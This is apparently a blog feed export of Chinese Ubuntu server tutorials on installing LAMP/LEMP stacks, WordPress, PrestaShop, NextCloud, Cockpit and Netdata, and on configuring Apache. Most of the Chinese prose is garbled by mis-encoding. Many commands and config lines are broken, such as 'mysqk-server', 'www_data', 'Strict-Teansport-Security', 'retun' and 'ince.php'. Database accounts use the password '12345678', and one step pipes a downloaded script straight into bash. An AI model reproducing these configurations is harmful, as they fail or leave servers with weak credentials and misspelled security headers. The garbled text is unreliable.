    <content type="text"><![CDATA[LAMPç¯å¢ƒå®‰è£…WordPressWEBåº”ç”¨ç¨‹åºåŸºç¡€å¥—ä»¶ æ“ä½œç³»ç»Ÿ( Linux ) WEBæœåŠ¡å™¨( Apacheã€Nginx ) æ•°æ®åº“( MySQLã€MariaDBã€ PostgreSQL) åº”ç”¨å¼€å‘è¯­è¨€( PHPã€Pythonã€ Perl ) å¤§é‡å¼€æºåº”ç”¨åŸºäºLAMPå¼€å‘ Wordpress Wiki Owncloud Phpmyadmin â€¦ â€¦ å®‰è£…LAMP(Linux + Apache + MySQL +PHP)è‡ªåŠ¨å®‰è£… # ä¸€æ¬¡æ€§å®‰è£… tasksel ç®€å•å¿«æ· apt install tasksel # è¿è¡Œå·¥å…· sudo tasksel # é€‰æ‹©å®‰è£…åŒ…,q å‹¾é€‰ï¼Œç¡®å®šå³å¯ #æµ‹è¯• echo "&lt;?php phpinfo();?>" > /var/www/html/info.php æ‰‹åŠ¨å®‰è£… apt install apache2 apt install mysqk-server mysql_secure_installation apt install php libapache2-mod php-mysql #æµ‹è¯• echo "&lt;?php phpinfo();?>" > /var/www/html/info.php WordPress å¼€æºå…è´¹çš„ä¸ªäººåšå®¢ç³»ç»Ÿ å…¨çƒ1/3çš„ä¸ªäººåšå®¢é‡‡ç”¨ åŸºäºLAMPå¼€å‘ å¼€ç®±å³ç”¨ å®‰è£… wget http://wordpress.org/latest.tar.gz sudo tar -zxvf latest.tar.gz -C /var/www/html # è®¾ç½®æƒé™ sudo chown www-data:www_data -R /var/www/html/myshop # è¿˜æ²¡æœ‰æ•°æ®åº“ åˆ›å»ºæ•°æ®åº“ -- è¿›å…¥sqlå‘½ä»¤è¡Œï¼ˆå»ºè®®ç”¨æˆ·åå¯†ç å’Œåº“åä¸è¦è¿™ä¹ˆç®€å•æ˜“çŒœï¼‰ create database wpdb; create user 'wpuser'@'localhost' identified by '12345678'; grant all on wpdb.* to 'wpuser'@'localhost' identified by '12345678' with grant option; flush privileges; é…ç½®æ–‡ä»¶ cd /var/www/html/wordpress/ cp wp-config-sample.php wp-config.php # ä»æ¨¡æ¿æ–‡ä»¶å¤åˆ¶ vim wp-config.php # ä¿®æ”¹åº“åï¼Œç”¨æˆ·ï¼Œå¯†ç  # ä»–ä¼šè‡ªåŠ¨å†™è¿›å»è¡¨ è™šæ‹Ÿä¸»æœºä¸å»ºè®®ä½¿ç”¨é»˜è®¤ç«™ç‚¹ cd /etc/apache2/sites-available/ cp 000-default.conf myblog.conf vim myblog.conf ServerName www.myblog.com DocumentRoot /var/www/html/wordpress # å…¶ä»–å®‰å…¨é…ç½® å¯ç”¨ç«™ç‚¹ a2ensite myblog.conf a2dissite 000-default.conf # ç¦ç”¨é»˜è®¤ç«™ç‚¹ systemctl reload apache2 Webé…ç½®è®¿é—®è®¾ç½®çš„åŸŸåhttp://myblog.com æ”¹ä¸ºä¸­æ–‡ä»å®˜ç½‘ä¸‹è½½ä¸­æ–‡è¯­è¨€åŒ…è§£å‹åˆ°/wp-content/ç›®å½•ä¸‹ï¼Œä¿®æ”¹wp-config.php define('WPLANG', 'zh_CN') æˆ–è€…ç›´æ¥ä¸‹è½½ä¸­æ–‡ç‰ˆhttps://cn.wordpress.org PHPMyAdmin &amp; ç”µå•†ç½‘ç«™æ­å»ºphpMyAdminåŸºäºWebåº”ç”¨çš„MySQLç®¡ç†åº”ç”¨, æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åº 1.ä¿®æ”¹èº«ä»½éªŒè¯æ–¹å¼ # è¿›å…¥sqlç»ˆç«¯ select user,host,plugin from mysql.user; "auth_socket" --> "mysql_native_password" 2.å®‰è£…PhpMyAdmin apt install phpmyadmin 3.ä¿®æ”¹/etc/apache2/apache2.confä¸»é…ç½®æ–‡ä»¶ # åŒ…å«phpmyadminçš„é…ç½®æ–‡ä»¶ Include /etc/phpmyadmin/apache.conf æµ‹è¯• http://wwwwww/phpmyadmin/ ç”µå•†ç½‘ç«™æ­å»ºå®‰è£…prestashopå¼€æºçš„ç”µå•†å¹³å° å¼€æºå…è´¹ å…¨çƒæœ‰25ä¸‡å°ç”µå•†å¹³å°ä½¿ç”¨ åŸºäºLAMPå¥—ä»¶ 1.å®‰è£…ä¾èµ–åŒ… sudo apt install php7.2-gd php7.2-xml php7.2-curl php7.2-zip 2.ä¸‹è½½ wget https://download.prestashop.com/download/releases/prestashop_1.7.4.1.zip sudo unzip prestashop_1.7.4.1.zip -d /var/www/html/myshop sudo chown www-data:www_data -R /var/www/html/myshop 3.åˆ›å»ºæ•°æ®åº“ sudo mysql -- è¿›å…¥sqlå‘½ä»¤è¡Œï¼ˆå»ºè®®ç”¨æˆ·åå¯†ç å’Œåº“åä¸è¦è¿™ä¹ˆç®€å•æ˜“çŒœï¼‰ create database myshop; create user 'myshop'@'localhost' identified by '12345678'; grant all on myshop.* to 'myshop'@'localhost' identified by '12345678' with grant option; flush privileges; 4.è™šæ‹Ÿä¸»æœº(ä¸å»ºè®®ä½¿ç”¨é»˜è®¤ç«™ç‚¹) cd /etc/apache2/sites-available/ cp 000-default.conf myshop.conf vim myshop.conf ServerName www.myshop.com DocumentRoot /var/www/html/myshop # è¿™é‡Œåªé…ç½®äº†æœ€ç®€å•çš„ï¼Œå…¶ä»–çš„é…ç½®æŒ‰ç…§å‰é¢çš„ç« èŠ‚è‡ªè¡Œé…ç½® 5.å¯ç”¨ç«™ç‚¹ sudo a2enmod rewrite # å¯ç”¨è¿™ä¸ªæ¨¡å— sudo a2ensite myshop.conf #a2dissite 000-default.conf # ç¦ç”¨é»˜è®¤ç«™ç‚¹ systemctl reload apache2 6.è®¿é—®ç«™ç‚¹ï¼Œè¿›è¡ŒWebé…ç½®è¡¨åçš„å‰ç¼€ä¸è¦é»˜è®¤ï¼Œå¦åˆ™å¦‚æœæœ‰æ¼æ´ï¼Œå®¹æ˜“è¢«çŒœè§£å®‰è£…å®Œæˆä¹‹åï¼Œè¦åˆ é™¤installæ–‡ä»¶ è¿™ä¸ªç½‘ç«™æºç æ˜¯å…è´¹çš„ï¼Œä½†æ˜¯ä¸»é¢˜æ˜¯æ”¶è´¹çš„â€¦â€¦ä¸”æ”¯ä»˜æ¥å£æ²¡å›½å†…çš„ LEMPç¯å¢ƒå®‰è£…NextCloudLEMP(Linux, Nginx, MySQ, PHP)Engine-x -&gt; Nginx 1.å®‰è£… sudo apt install nginx sudo apt install mariadb-server mariadb-client sudo mysql_secure_installation # é’ˆå¯¹ä¸åŒè½¯ä»¶åŒ…ï¼Œå®‰è£…ä¸åŒçš„ç»„ä»¶ï¼Œè¿™é‡Œå®‰è£…ä¸‹é¢è¿™äº› sudo apt install php7.2 php7.2-fpm php7.2-mysql php7.2-mbstring php7.2-xml php7.2-gd php7.2-curl php7.2-imagick php7.2-zip php7.2-bz2 php7.2-intl # é…ç½®php sudo vim /etc/php/7.2/fpm/php.ini cgi.fix_pathinfo=0 date.timezone = Asia/shanghai 2.é…ç½®Nginx # è¿™é‡Œä½¿ç”¨é»˜è®¤ç«™ç‚¹ # sudo vim /etc/nginx/sites-available/default index index.php location ~\.php$ { fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include snippets/fastcgi-php.conf; include fastcgi_params; } # é‡å¯ sudo nginx -t sudo systemctl restart nginx 3.è®¿é—®, éªŒè¯ç¯å¢ƒæ˜¯å¦æˆåŠŸ 4.ä¸‹è½½NextCloud # NextCloud å…è´¹å¼€æºçš„ä¸ªäººäº‘ç›˜ # å®˜ç½‘ä¸‹è½½æˆ–wgetä¸‹è½½ wget https://download.nextcloud.com/server/releases/nextcloud-13.0.4.zip sudo unzip nextcloud-13.0.4.zip -d /var/www/html/mycloud sudo chown www-data:www-data -R /var/www/html/mycloud 5.å»ºåº“ -- è¿›å…¥sqlå‘½ä»¤è¡Œ create database mycloud; create user 'mycloud'@'localhost' identified by '12345678'; grant all privileges on mycloud.* to 'mycloud'@'localhost' identified by '12345678' with grant option;; flush privileges; 6.ç”Ÿæˆè¯ä¹¦(å®‰å…¨è€ƒè™‘) # è¿™é‡Œä½¿ç”¨è‡ªç­¾åè¯ä¹¦ sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/mysite.key -out /etc/ssl/certs/mysite.pem 7.é…ç½®æ–‡ä»¶ # cd /etc/nginx/site-available/ # sudo vim mycloud.conf server { listen 80; server_name www.mycloud.com; # ä¸è®©è®¿é—®è€…é€šè¿‡httpè®¿é—®ï¼Œå¼ºåˆ¶é‡å®šå‘ return 301 https://www.mycloud.com$request_uri; } server { listen 443 ssl http2; # è¯ä¹¦ä½ç½® ssl_certificate /etc/ssl/certs/mysite.pem; ssl_certificate_key /etc/ssl/private/mysite.key; # å¤´éƒ¨ add_header Strict-Teansport-Security "max-age-31536000" always; # sslå¢å¼ºç‰ˆåè®®çš„å¤´éƒ¨ # ç­‰ç»éªŒä¸°å¯Œåï¼Œè‡ªå·±è¦æ·»åŠ å¤´éƒ¨ä¿¡æ¯ä½  add_header X-Conten-Type-Option nosniff; add_header X-XSS-Protection "1;mode=block"; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Doamin-Policies none; root /var/www/html/mycloud/; location = /robots.txt { allow all; log_not_found off; access_log off; } location = /.well-known/carddav { retun 301 $schema://$host/remote.php/dav; } location = /.well-known/calddav { retun 301 $schema://$host/remote.php/dav; } location = /.well-known/acme-challenge { allow all; } client_max_body_size 512M; fastcgi_buffers 64 4K; gzip off; error_page 403 /core/templates/403.php; error_page 404 /core/templates/404.php; location = / { rewrite ^ /ince.php$uri; } location = /(?:build|tests|config|lib|3rdparty|templates|data)/ { deny all; } # ....... } ## ......å‰©ä¸‹è¯¦ç»†çš„é…ç½® 8.å¯ç”¨ç«™ç‚¹é…ç½® ln -s /etc/nginx/site-available/mycloud.conf /etc/nginx/site-enabled/mycloud.conf # reload å¹¶ restart nginx 9.Dataç›®å½• # æ–‡ä»¶èµ„æºé»˜è®¤ä¼šåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„Dataç›®å½• # å»ºè®®ä¸è¦æ”¾åœ¨é»˜è®¤ä½ç½®, è¿™é‡Œæ”¾åœ¨ä¸Šä¸€çº§ç›®å½• sudo mkdir /var/www/html/cloud_data sudo chown www-data:www-data -R /var/www/html/cloud_data 10.ç½‘é¡µè®¾ç½® è®¿é—® https://xxxxx.com # è®¾ç½®ç”¨æˆ·å/å¯†ç ï¼Œæ•°æ®åº“ï¼Œdataç›®å½• # æ³¨æ„è´¦æˆ·å®‰å…¨å“¦(ä¸è¦è®¾ç½®adminç­‰) # ä¿®æ”¹è¯­è¨€ 11.å®¢æˆ·ç«¯ sudo add-apt-repository ppa:nextcloud-devs/client sudo apt install nextcloud-client # æˆ–å®˜ç½‘ä¸‹è½½PCå’Œandroidçš„å®¢æˆ·ç«¯ å…¶ä»–Webåº”ç”¨1.Cockpit åŸºäºWebçš„è¿œç¨‹ç®¡ç†å’Œç³»ç»Ÿç›‘æ§ åŸºäºWebçš„è¿œç¨‹ç®¡ç†åº”ç”¨ å°†æ‰€æœ‰ç»„ä»¶æ‰“åŒ…åœ¨ä¸€èµ· ä¸ä»¥æ¥å•ç‹¬éƒ¨ç½²çš„LAMP/LEMP, ä¸€æ¡å‘½ä»¤å®‰è£…éƒ¨ç½² å®‰è£… sudo apt install cockpit cockpit-docker è®¿é—®æ–¹å¼: https://www.com:9090 ç™»å½•è´¦æˆ·åŒæ“ä½œç³»ç»Ÿ å¯ä»¥çœ‹åˆ°ç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ï¼Œç®¡ç† å¯ä»¥æ·»åŠ å…¶ä»–å®‰è£…äº†Cockpitçš„æœåŠ¡å™¨åœ¨ä¸€ä¸ªæœºå™¨çš„Webç•Œé¢å®‰è£…(å‰ææ˜¯ç™»å½•çª—å£æ—¶å€™è¿›è¡Œå‹¾é€‰), å¤šå°æœåŠ¡å™¨ å®˜ç½‘åœ°å€: https://cockpit-projece.org Netdata åŸºäºWebå»ºæ„çš„Linuxç³»ç»Ÿå®æ—¶æ€§èƒ½ç›‘è§†å·¥å…· cpu, å†…å­˜ï¼Œç¡¬ç›˜ï¼Œç½‘ç»œï¼Œè¿›ç¨‹ï¼Œç¡¬ä»¶ å ç”¨ç³»ç»Ÿèµ„æºå°‘(1-3%) å®æ—¶è‡ªåŠ¨å‘Šè­¦ ç³»ç»Ÿå‡ºé—®é¢˜ä¹‹å‰ï¼Œå¾€å¾€æœ‰å¼‚å¸¸çš„å¾å…† ä¾èµ–åŒ… sudo apt install git zlib1g-dev uuid-dev libmnl-dev gcc make autoconf autoconf-archive autogen automake pkg-config curl python python-yaml python-mysqldb python-psycopg2 nodejs lm-sensors netcat å®‰è£… bash &lt;(curl -Ss https://my-netdata.io/kickstart-static64.sh) # ç°åœ¨ä¸èƒ½è®¿é—®äº† # æˆ–ç”¨aptå®‰è£… sudo apt install netdata # è®¿é—® http://xxxxx.com:19999 å¼€å…³ # å¯åŠ¨ï¼šä½ç½®æ ¹æ®ç³»ç»Ÿä¼šæœ‰ä¸åŒã€‚å»ºè®®åŠ ä¸Š-Då‚æ•°å‰å°è¿è¡Œï¼Œä¸è¦åå°è¿è¡Œ $ sudo netdata -D $ æˆ– $ sudo /usr/sbin/netdata -D # æˆ–ï¼ˆMacä¸Šï¼‰ $ sudo /usr/local/sbin/netdata -D # å…³é—­ï¼ˆæ–¹æ³•å¾ˆå¤šç§ï¼Œå¾€å¾€åªæœ‰ä¸€ç§ç”Ÿæ•ˆï¼‰ $ sudo killall netdata # æˆ– $ sudo pkill -9 netdata # æˆ– $ sudo service netdata stop # æˆ– $ sudo /etc/init.d/netdata stop # æˆ– $ sudo systemctl stop netdata document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>LMAP</tag>
        <tag>LEMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-WebæœåŠ¡]]></title>
    <url>%2Fposts%2F6291%2F</url>
    <content type="text"><![CDATA[WWWä»‹ç»www ä¸‡ç»´ç½‘ é™æ€ç½‘ç«™ï¼šæ‰€æœ‰äººçœ‹åˆ°çš„å†…å®¹éƒ½ä¸€æ · åŠ¨æ€åº”ç”¨ç¨‹åºï¼š æ•°æ®åº“ã€ä¸­é—´ä»¶ æ¯ä¸ªç”¨æˆ·çœ‹åˆ°çš„å†…å®¹ä¸åŒ æ ¹æ®ç”¨æˆ·è¾“å…¥è¿”å›ä¸åŒç»“æœ è®¿é—®æ–¹å¼ FQDNï¼š(Fully Qualified Domain Name)å…¨é™å®šåŸŸåï¼šåŒæ—¶å¸¦æœ‰ä¸»æœºåå’ŒåŸŸåçš„åç§°ã€‚ï¼ˆé€šè¿‡ç¬¦å·â€œ.â€ï¼‰ ä¼ è¾“åè®®SSLåŸºæœ¬è¢«æ›¿ä»£äº†ï¼ŒTSLä½¿ç”¨æœ€å¤šputå¸¸ç”¨äºä¸Šä¼ æ–‡ä»¶optionsæŸ¥çœ‹éƒ½æ”¯æŒå“ªäº›æ–¹æ³•headeråªæ˜¯å¤´éƒ¨çš„ä¿¡æ¯(è¯·æ±‚/å“åº”) HTTPåè®®å¸¸è§æœåŠ¡ç«¯å“åº”çŠ¶æ€ç æ›´å¤šè¯¦ç»†çŠ¶æ€ç ï¼Œè§åœ°å€ï¼š http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html Apache2Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€ä¸ªå¼€æºWebæœåŠ¡å™¨æ¨¡å—åŒ–å¼ºå¤§çš„æ‰©å±•èƒ½åŠ›ï¼š SSOæ¨¡å— å¹¶å‘é™åˆ¶æ¨¡å— æ—¥å¿—ç›‘æ§æ¨¡å— WAFæ¨¡å— è´Ÿè½½å‡è¡¡æ¨¡å— éŸ³ä¹/å›¾åƒå¤„ç†æ¨¡å— å®‰è£…sudo apt install apache2 # é»˜è®¤ä¾¦å¬ç«¯å£ TCP 80 é€šè¿‡ä¼—å¤šdirectivesè¿›è¡Œé…ç½®åœ¨Ubuntuä¸­ï¼Œdirectivesåˆ†æ•£äºå¤šä¸ªé…ç½®æ–‡ä»¶ä¸­ é…ç½®æ–‡ä»¶ï¼šconf-enabled(å¯ç”¨çš„)ä¸­çš„æ–‡ä»¶éƒ½æ˜¯é“¾æ¥åˆ°conf-available(å¯ç”¨çš„)ä¸‹çš„é…ç½®æ–‡ä»¶ï¼ˆåˆ›å»ºäº†é“¾æ¥çš„æ‰ç”Ÿæ•ˆçš„ï¼Œæ‰€ä»¥å¯ä»¥é…ç½®ä¸€äº›å¤‡ç”¨çš„ä¸è®¾ç½®é“¾æ¥ï¼‰ï¼Œä¿®æ”¹å®Œéœ€è¦é‡å¯æœåŠ¡æ¨¡å—ç›®å½•ï¼šmods-enabledä¸mods-availableï¼Œè·Ÿä¸Šé¢ä¸¤è€…å…³ç³»ç±»ä¼¼ç«™ç‚¹ï¼šsites-enabledä¸sites-available ä¸åŒipä»¥åŠä¸åŒç«¯å£å¯ä»¥æ˜ å°„ä¸åŒçš„ç½‘ç«™ â€“&gt; åŒä¸€ä¸ªipåŒä¸€ä¸ªç«¯å£æ¥è®¾ç½®å¤šä¸ªç½‘ç«™(ä¸åŒåŸŸåéƒ½è§£æåˆ°è¿™ä¸ªip, æœåŠ¡ç«¯æ ¹æ®åŸŸåå­—æ®µ[ä¸»æœºå¤´]æ¥åˆ¤æ–­è¿”å›å“ªä¸ªé¡µé¢) â€“&gt; å³ä¸ºè™šæ‹Ÿä¸»æœº è™šæ‹Ÿä¸»æœºç®€å•é…ç½® ä¸€èˆ¬å…ˆä»availableç›®å½•å¼€å§‹åˆ›å»ºï¼Œè‡³äºå¯ç”¨ä¸å¦è¿˜å¾—é…ç½®enabledæœ¬è´¨ä¸Šé…ç½®æŒ‡ä»¤å¯ä»¥ä½äºä»»ä½•ä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­ é…ç½®sites-availableä¸‹è®²è§£ï¼š # /etc/apache2/sites-available/000-default.conf # é»˜è®¤è™šæ‹Ÿä¸»æœº &lt;VirtualHost *:80> # åŒ¹é…ipï¼Œ*ä»£è¡¨ä»»æ„ip , ä¾¦å¬ä»»æ„ipçš„80ç«¯å£ ServerName www.example.com # è®¾ç½®ä¸»æœºå¤´ï¼ˆè™šæ‹Ÿä¸»æœºçš„åŸŸåï¼‰ ServerAdmin webmaster@localhost # æŠ¥é”™æ—¶æ˜¾ç¤ºçš„ç®¡ç†å‘˜é‚®ç®± DocumentRoot /var/www/html # æŒ‡å®šWebæ ¹ç›®å½• ErrorLog ${APACHE_LOG_DIR}/error.log # æŠ¥é”™æ—¥å¿— CustomLog ${APACHE_LOG_DIR}/access.log combined # è®¿é—®æ—¥å¿— # ä¾¦å¬ç«¯å£ &lt;/VirtualHost> å®éªŒåˆ›å»ºaliå’Œbaidä¸¤ä¸ªåŸŸåçš„è™šæ‹Ÿä¸»æœº1.åˆ›å»ºæ–°çš„è™šæ‹Ÿä¸»æœºï¼ˆåœ¨sites-availableï¼‰ # å¤åˆ¶ä¸¤ä¸ªé…ç½®æ–‡ä»¶ sudo cp 000-default.conf ali.conf sudo cp 000-default.conf baid.conf # åˆ†åˆ«è¿›è¡Œé…ç½® ServerName www.ali.com DocumentRoot /var/www/ali # ServerName www.baid.com DocumentRoot /var/www/baid # åˆ†åˆ«ç¼–è¾‘é¡µé¢æ–‡ä»¶ sudo vim /var/www/ali/index.html sudo vim /var/www/baid/index.html 2.åˆ›å»ºé“¾æ¥(åœ¨sites-enabled) # å¯ä»¥ç”¨ln åˆ›å»º # apacheæä¾›äº†æ›´ç®€å•çš„æ–¹å¼ sudo a2ensite ali sudo a2ensite baid # é‡æ–°åŠ è½½ service apache2 reload ## Noteï¼š ServerAlias *.lab.com # åŸŸåé€šé…ç¬¦ sudo a2ensite mynewSite # å¯ç”¨è™šæ‹Ÿä¸»æœº sudo systemctl restart apache2.service # é‡å¯æœåŠ¡ sudo a2dissite mynewSite # åœç”¨è™šæ‹Ÿä¸»æœºï¼ˆç¦ç”¨æŸä¸ªç«™ç‚¹ï¼‰ 3.è¿™é‡Œåšå®éªŒï¼ŒåŸŸåå°±ç®€å•é€šè¿‡hostsæ–‡ä»¶åšäº†è§£æ 192.168.11.130 www.ali.com 192.168.11.130 www.baid.com 3.è®¿é—® ä¾¦å¬ç«¯å£/etc/apaches/ports.conf Apacheä¸­é»˜è®¤åŸºæœ¬é…ç½®1.ç´¢å¼•æ–‡ä»¶indexï¼šDirectoryIndex ## å¯ä»¥æ ¹æ®éœ€æ±‚,æ‰‹åŠ¨ä¿®æ”¹ç´¢å¼•é¡µçš„åç§°ï¼ˆä¸€èˆ¬ä¸å»ºè®®ä¿®æ”¹ï¼‰ # /etc/apache2/mods-available/dir.conf &lt;IfModule mod_dir.c> DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm # æœ‰å…ˆåçš„æ‰§è¡Œé¡ºåº &lt;/IfModule> # Noteï¼š è‹¥æ²¡æœ‰æ­£ç¡®æ”¾ç½®indexç´¢å¼•æ–‡ä»¶ï¼Œä¼šçœ‹åˆ°æ–‡ä»¶åˆ—è¡¨ï¼Œå¯èƒ½ä¼šæœ‰å®‰å…¨éšæ‚£ 2.htmlæ ¼å¼å±•ç¤ºç›®å½•åˆ—è¡¨ï¼šOptionsã€å®‰å…¨è€ƒè™‘ã€‘â€“&gt;å»æ‰ç”±äºæ²¡æœ‰ç´¢å¼•æ–‡ä»¶ä¼šæ˜¾ç¤ºæ–‡ä»¶åˆ—è¡¨çš„é€‰é¡¹ ## /etc/apache2/apache2.conf ä¸»é…ç½®æ–‡ä»¶ &lt;Directory /var/www/> # å¯¹æ–‡ä»¶ç›®å½•æƒé™çš„é…ç½® Options Indexes FollowSymLinks # Indexes:è‹¥æ²¡æœ‰ç´¢å¼•æ–‡ä»¶,å°±ä¼šæ˜¾ç¤ºç›®å½•åˆ—è¡¨;å»æ‰Indexeså°±ä¸ä¼šæ˜¾ç¤ºåˆ—è¡¨äº†ï¼Œæç¤º"æƒé™æ‹’ç»" AllowOverride None Require all granted &lt;/Directory> # é‡å¯æœåŠ¡ 3.Permission Denied ä»¥ä¸Š1,2ä¸¤é¡¹éƒ½ä¸åŒ¹é…ï¼Œå°±ä¼šæ˜¾ç¤ºâ€æƒé™æ‹’ç»â€ 4.ErrorDocument æŠ¥é”™æç¤ºã€å®‰å…¨è€ƒè™‘ã€‘â€“&gt; é»˜è®¤404æˆ–æŠ¥é”™é¡µé¢ä¼šæ³„éœ²ä¿¡æ¯æˆ–æ‰«æå™¨ï¼Œå»ºè®®æ›¿æ¢ä¸ºæˆ‘ä»¬è‡ªå®šä¹‰çš„é¡µé¢â€“&gt;ä¸å‘Šè¯‰ç”¨æˆ·ä¸æˆåŠŸçš„å…·ä½“åŸå› ,åªå‘Šè¯‰ä»–å‡ºé”™äº† # /etc/apache2/conf-available/localized-error-pages.conf ErrorDocument 404 /error/404.html # å®šä¹‰è‡ªå·±çš„é¡µé¢ # é‡å¯æœåŠ¡ 5.åŸºäºç›®å½•çš„Options ## /etc/apache2/apache2.conf ä¸»é…ç½®æ–‡ä»¶ &lt;Directory /var/www/> Options Indexes &lt;/Directory> # å…¶ä»–é…ç½®é¡¹(æƒé™è¦æœ€å°åŒ–åŸåˆ™ï¼Œå®‰å…¨èµ·è§) ExecCGI # å…è®¸CGIè„šæœ¬æ‰§è¡Œçš„ç›®å½•(/usr/lib/cgi-bin) Includes # å…è®¸æœåŠ¡ç«¯åŒ…å«ï¼ˆä¸€ä¸ªhtmlåŒ…å«å¦ä¸€ä¸ªhtml,æ¨¡æ¿åŒ–ï¼‰ IncludeNOEXEC # å…è®¸åŒ…å«ï¼Œä½†è¿›å±•CGIè„šæœ¬execã€include # é‡å¯æœåŠ¡ 6.ç¯å¢ƒå˜é‡ # /etc/apache2/envvars å¯ä»¥ä¿®æ”¹ç”¨æˆ·å’Œç»„å’Œpidç­‰ User /Group # æœåŠ¡å™¨ç«¯åº”ç­”å®¢æˆ·ç«¯è®¿é—®çš„è´¦å·(www-data) PidFile # /var/run/apache2/apache2.pid # æœ€å¤§å¹¶å‘æ•°ï¼ˆé»˜è®¤8192ï¼‰ APACHE_ULIMIT_MAX_FILES='ulimit -n 65536' æ¨¡å—åŒ–æœåŠ¡å™¨æ ¸å¿ƒåªå®ç°äº†åŸºæœ¬åŠŸèƒ½ apache2 -l # æŸ¥çœ‹é»˜è®¤è¢«ç¼–è¯‘åˆ°apacheæ ¸å¿ƒåŒ…é‡Œé¢çš„æ¨¡å— å…¶ä»–åŠŸèƒ½é€šè¿‡æ¨¡å—å®ç°ubuntuç¼–è¯‘åŠ¨æ€åŠ è½½æ¨¡å—å®ç°è¿è¡Œæ—¶æ¨¡å—è°ƒç”¨ apt search libapache2-mod # æœç´¢æ¨¡å— sudo apt install libapache2-mod0auth-mysql # å®‰è£…æ¨¡å— sudo a2enmod auth_mysql # å¯ç”¨æ¨¡å— sudo a2dismod auth_mysql # ç¦ç”¨æ¨¡å— å¼€å¯HTTPSä¼ è¾“è¿‡ç¨‹ä¸­çš„CIA (æœºå¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§)ï¼Œä½†æ˜¯ä¸æä¾›åº”ç”¨å±‚å®‰å…¨ # /etc/apache2/sites-available/default-ssl.conf sudo a2ensite default-ssl # å¼€å§‹sslåŠ å¯†(é»˜è®¤æœªå¯åŠ¨) sudo a2ebmod ssl # é»˜è®¤æœªå¯åŠ¨ _default_:443 # æœªæŒ‡å®šè™šæ‹Ÿä¸»æœºæƒ…å†µä¸‹çš„443ç«¯å£è®¿é—®, é»˜è®¤æ˜¯443(é™¤äº†å…¶ä»–æŒ‡å®šäº†è™šæ‹Ÿä¸»æœºåçš„ï¼ŒæœªæŒ‡å®šçš„å°±è®¿é—®åˆ°è¿™é‡Œ) SSLEngine on # å¼€å¯SSl/TSL SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem # è¯ä¹¦æ–‡ä»¶(é»˜è®¤å·²ç»è‡ªå¸¦äº†ä¸€å¼ è¯ä¹¦) SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key SSLCertificateChainFile /etc/apache2/ssl.crt/server-ca.crt # è¯ä¹¦çš„åŠ å¯†é“¾æ–‡ä»¶ SSLCARevocationFile /etc/apache2/ssl.crl/ca-bundle.crl # è¯ä¹¦åŠé”€åˆ—è¡¨ SSLVerifyClient require # è¦æ±‚å®¢æˆ·ç«¯æä¾›è¯ä¹¦(ä¸å¯æŠµèµ–æ€§) &lt;FilesMatch "\.(cgi|shtml|phtml|php)$"> # åŸºäºæ–‡ä»¶ç±»å‹ï¼Œè®¾ç½®ä¸åŒç¯å¢ƒå˜é‡è¿›è¡ŒåŠ å¯† SSLOptions +StdEnvVars &lt;/FilesMatch> &lt;Directory /usr/lib/cgi-bin> # å¯¹æŒ‡å®šç›®å½• SSLOptions +StdEnvVars # æ ‡å‡†ç¯å¢ƒå˜é‡ &lt;/Directory> ssl-unclean-shutdown # åªæ˜¯æœåŠ¡å™¨ç«¯å‘å®¢æˆ·ç«¯æ–­å¼€è¿æ¥(è¿½æ±‚é€Ÿåº¦) ssl-accurate-shutdown # æœåŠ¡å™¨ç«¯ä¸å®¢æˆ·ç«¯çš„è¿æ¥ç«¯å£äº†ï¼Œå®¢æˆ·ç«¯è¿˜æœ‰å‘æœåŠ¡ç«¯å†ç¡®è®¤(è¿½æ±‚ç¨³å®šæ€§) nokeepalive ssl-unclean-shutdown downgrade-1.0 force-response-1.0 # é™çº§å“åº” # è¿˜å¯ä»¥æŒ‰è‡ªå·±éœ€è¦... ## å¯ç”¨å¹¶é‡å¯æœåŠ¡ sudo a2ensite default-ssl service apache2 reload sudo systemctl restart apache.service ## å¯ä»¥è®¿é—®äº†(ubuntuè‡ªå·±ç”Ÿæˆçš„è¯ä¹¦æµè§ˆå™¨ä¼šæç¤ºä¸å®‰å…¨) è¯ä¹¦å‘è¯ä¹¦é¢å‘æœºæ„ç”³è¯·çš„åˆæ³•è¯ä¹¦å°±å¯ä»¥æ›¿æ¢ubuntuè‡ªå¸¦çš„è¯ä¹¦ # ä½¿ç”¨CAæœºæ„ç­¾åè¯ä¹¦ sudo openssl req -newkey rsa:2048 -nodes -keyout server.key -out server.pem # ä½¿ç”¨è‡ªç­¾åè¯ä¹¦ sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/mysite.key -out /etc/ssl/certs/mysite.pem åˆ›å»ºHTTPSè™šæ‹Ÿä¸»æœºå’Œåˆ›å»ºä¸€èˆ¬è™šæ‹Ÿä¸»æœºæ˜¯ç±»ä¼¼çš„ å»ºè®®å•†ä¸šè¯ä¹¦é¢å‘æœºæ„(æƒå¨æœºæ„é¢å‘ï¼Œé»˜è®¤å—ä¿¡ï¼Œå¢å¼ºç‰¹æ€§ï¼Œæ”¶è´¹é«˜æ˜‚ï¼Œæœ‰æ•ˆæœŸé•¿) é‚£æ²¡é’±æ€ä¹ˆåŠå‘¢ï¼Ÿæœ‰å‡ 